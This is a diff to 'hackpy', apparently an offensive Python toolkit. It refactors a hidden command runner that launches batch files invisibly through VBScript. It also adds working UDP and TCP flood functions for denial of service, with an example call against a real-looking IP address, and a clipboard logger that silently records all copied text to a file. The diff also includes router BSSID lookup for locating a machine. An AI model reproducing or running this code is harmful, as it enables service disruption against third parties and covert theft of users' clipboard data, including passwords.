@@ -17,11 +17,14 @@ from os import startfile as os_startfile
 from json import load as json_load
 from time import sleep as time_sleep
 from time import time as time_time
+from time import ctime as time_ctime
 from shutil import move as shutil_move
 from wget import download as wget_download
 from getmac import get_mac_address as getmac
 from random import randint as random_randint
 from random import _urandom as random_urandom
+from pyperclip import copy as pyperclip_copy
+from pyperclip import paste as pyperclip_paste
 from socket import gethostbyname as socket_gethostbyname
 from socket import gethostname as socket_gethostname
 from socket import socket, AF_INET, SOCK_DGRAM, SOCK_STREAM
@@ -82,33 +85,34 @@ def unload():
 
 # Clean temp hackpy cache
 def clean():
-	system('@cd ' + install_path + ' && @del *.bat > NUL && @del *.vbs > NUL')
+	command.system('@cd ' + install_path + ' && @del *.bat > NUL && @del *.vbs > NUL')
 
 
-# Execute system command
-def system(command):
-	# Temp files names
-	bat_script_path = install_path + '\\' + 'bat_script_' + str(random_randint(1, 100000)) + '.bat'
-	vbs_script_path = install_path + '\\' + 'vbs_script_' + str(random_randint(1, 100000)) + '.vbs'
-	# Temp files commands
-	bat_script = '@' + command
-	vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
-	# Write bat commands
-	with open(bat_script_path, "w") as bat_script_write:
-		bat_script_write.write(bat_script)
-	# Write vbs commands
-	with open(vbs_script_path, "w") as vbs_script_write:
-		vbs_script_write.write(vbs_script)
-	time_sleep(0.1)
-	os_startfile(vbs_script_path)
+class command:
+	# Execute system command: hackpy.command.system('command')
+	# Execute nircmdc command: hackpy.command.nircmdc('command')
+	def system(recived_command):
+		# Temp files names
+		bat_script_path = install_path + '\\' + 'bat_script_' + str(random_randint(1, 100000)) + '.bat'
+		vbs_script_path = install_path + '\\' + 'vbs_script_' + str(random_randint(1, 100000)) + '.vbs'
+		# Temp files commands
+		bat_script = '@' + recived_command
+		vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
+		# Write bat commands
+		with open(bat_script_path, "w") as bat_script_write:
+			bat_script_write.write(bat_script)
+		# Write vbs commands
+		with open(vbs_script_path, "w") as vbs_script_write:
+			vbs_script_write.write(vbs_script)
+		time_sleep(0.1)
+		os_startfile(vbs_script_path)
 
-# Execute nircmdc command
-def nircmdc(command, priority='NORMAL'):
-	# Check nircmdc.exe file
-	if os_path.exists(install_path + '\\nircmdc.exe'):
-		system('@start /MIN /B /' + priority + ' ' +  install_path + '\\nircmdc.exe' + ' ' + command)
-	else:
-		raise FileNotFoundError('hackpy - You don\'t loaded nircmdc.exe please make hackpy.load() after importing this module.')
+	def nircmdc(recived_command, priority='NORMAL'):
+		# Check nircmdc.exe file
+		if os_path.exists(install_path + '\\nircmdc.exe'):
+			command.system('@start /MIN /B /' + priority + ' ' +  install_path + '\\nircmdc.exe' + ' ' + recived_command)
+		else:
+			raise FileNotFoundError('hackpy - You don\'t loaded nircmdc.exe please make hackpy.load() after importing this module.')
 
 # Get info by ip address
 # WARNING! Usage limits:
@@ -158,32 +162,27 @@ def bssid_locate(bssid, statusbar = None, out_tempfile = 'bssid_locate.json'):
         return bssid_data['data']
 
 # Get router BSSID
-def router(router_urls = ['192.168.1.1', '192.168.0.1', '192.168.2.1', '10.0.0.2', '10.0.1.1', '10.1.1.1']):
-    try:
-        SMART_ROUTER_IP = socket_gethostbyname(socket_gethostname()).split('.')[:-1]
-        SMART_ROUTER_IP = '.'.join(SMART_ROUTER_IP) + '.1'
-        router_urls.insert(0, SMART_ROUTER_IP)
-    except:
-        pass
-    for address in router_urls:
-        BSSID = getmac(ip = address)
-        if BSSID == None:
-            continue
-        else:
-            break
-    return BSSID
+def router():
+	try:
+		SMART_ROUTER_IP = socket_gethostbyname(socket_gethostname()).split('.')[:-1]
+		SMART_ROUTER_IP = '.'.join(SMART_ROUTER_IP) + '.1'
+		BSSID = getmac(SMART_ROUTER_IP)
+	except:
+		return None
+	else:
+		return BSSID
 
-def install_python(version = '3.7.0', path = os_environ['SystemDrive'] + '\\python'):
+def install_python(version = '3.7.0', path = os_environ['SystemDrive'] + '\\python37'):
 	#
 	# Install python to system
-	# Example: install_python(version = '3.6.0', path = 'C:\\python37')
+	# Example: hackpy.install_python(version = '3.6.0', path = 'C:\\python37')
 	# Default version is: 3.7.0 and install path is: C:\python
 	#
 	if os_path.exists(path):
 		raise FileExistsError('Python is installed')
 	else:
 		wget_download('https://www.python.org/ftp/python/' + version + '/python-' + version + '.exe', bar = None, out = 'python_setup.exe')
-		system('python_setup.exe /quiet TargetDir=' + path + ' PrependPath=1 Include_test=0 Include_pip=1')
+		command.system('python_setup.exe /quiet TargetDir=' + path + ' PrependPath=1 Include_test=0 Include_pip=1')
 		if os_path.exists(path):
 			return True
 		else:
@@ -229,34 +228,65 @@ def detect_protection():
 
     return detected
 
-# UDP flood
-def udp_flood(ip, port, duration):
-	sent = 0
-	client = socket(AF_INET, SOCK_DGRAM)
-	bytes = random_urandom(1024)
-	timeout = time_time() + duration
-	while True:
-		if time_time() > timeout:
-			break
-		client.sendto(bytes, (ip, port))
-		sent += 1
-		print("[UDP] Attacking " + str(sent) + " sent packages " + str(ip) + " at the port " + str(port))
+class ddos:
+	#
+	# UDP flood:
+	# hackpy.ddos.udp('172.217.16.46', 8080, duration = 10, message = True)
+	# TCP flood
+	# hackpy.ddos.tcp('172.217.16.46', 8080, duration = 15, message = True)
+	#
+	def udp(ip, port, duration, message = False):
+		sent = 0
+		client = socket(AF_INET, SOCK_DGRAM)
+		bytes = random_urandom(1024)
+		timeout = time_time() + duration
+		while True:
+			if time_time() > timeout:
+				break
+			client.sendto(bytes, (ip, port))
+			sent += 1
+			if message == True:
+				print("[UDP] Attacking... " + str(sent) + " sent packages " + str(ip) + " at the port " + str(port))
+
+	def tcp(ip, port, duration, message = False):
+		sent = 0
+		bytes = random_urandom(1024)
+		timeout = time_time() + duration
+		while True:
+			if time_time() > timeout:
+				break
+			s = socket(AF_INET, SOCK_STREAM)
+			s.connect((ip, port))
+			s.send(bytes)
+			sent += 1
+			s.close()
+			if message == True:
+				print("[TCP] Attacking... " + str(sent) + " sent packages " + str(ip) + " at the port " + str(port))
 
 
-# TCP flood
-def tcp_flood(ip, port, duration):
-	sent = 0
-	bytes = random_urandom(1024)
-	timeout = time_time() + duration
-	while True:
-		if time_time() > timeout:
-			break
-		s = socket(AF_INET, SOCK_STREAM)
-		s.connect((ip, port))
-		s.send(bytes)
-		sent += 1
-		s.close()
-		print("[TCP] Attacking " + str(sent) + " sent packages " + str(ip) + " at the port " + str(port))
+class clipboard:
+	#
+	# hackpy.clipboard.set('Text') # Copy text to clipboard
+	# print('Data in clipboard:' + clipboard.get()) # Get text from clipboard
+	# hackpy.clipboard.logger('clip_logs.txt') # Log all clipboard changes to file.
+	#
+	def set(text):
+		pyperclip_copy(text)
+
+	def get():
+		return pyperclip_paste()
+
+	def logger(file):
+		try: os_remove(file)
+		except: pass
+		clipboard_data_old = None
+		while True:
+			time_sleep(1)
+			clipboard_data = str(pyperclip_paste())
+			if clipboard_data != clipboard_data_old:
+				with open(file, "a") as cliplogger_file:
+					cliplogger_file.write('[' + time_ctime() + '] - Text: ' + str(pyperclip_paste()) + '\n')
+				clipboard_data_old = str(pyperclip_paste())
 
 if __name__ == '__main__':
 	print(10 * '\n' + logo)
